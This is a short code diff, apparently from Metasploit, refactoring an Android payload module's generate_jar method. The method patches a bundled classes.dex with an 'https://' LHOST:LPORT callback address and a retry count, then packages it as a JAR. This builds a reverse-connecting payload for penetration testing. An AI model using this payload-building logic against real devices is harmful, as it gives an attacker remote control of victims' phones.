@@ -30,15 +30,21 @@ module Metasploit3
   end
 
   def generate_jar(opts={})
-    host = datastore['LHOST'] ? datastore['LHOST'].to_s : String.new
-    port = datastore['LPORT'] ? datastore['LPORT'].to_s : 8443.to_s
-    raise ArgumentError, "LHOST can be 32 bytes long at the most" if host.length + port.length + 1 > 32
+    host = datastore['LHOST'] || ""
+    port = ( datastore['LPORT'] || 8443 ).to_s
+    if host.length + port.length + 1 > 32
+      raise ArgumentError, "LHOST can be 32 bytes long at the most" 
+    end
 
     jar = Rex::Zip::Jar.new
 
-    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
-    string_sub(classes, 'ZZZZ                                ', "ZZZZhttps://" + host + ":" + port)
-    string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
+    classes = ::File.read(::File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
+    classes = string_sub(classes, 'ZZZZ                                ', "ZZZZhttps://" + host + ":" + port)
+    
+    if datastore['RetryCount']
+      classes = string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s)
+    end
+    
     jar.add_file("classes.dex", fix_dex_header(classes))
 
     files = [
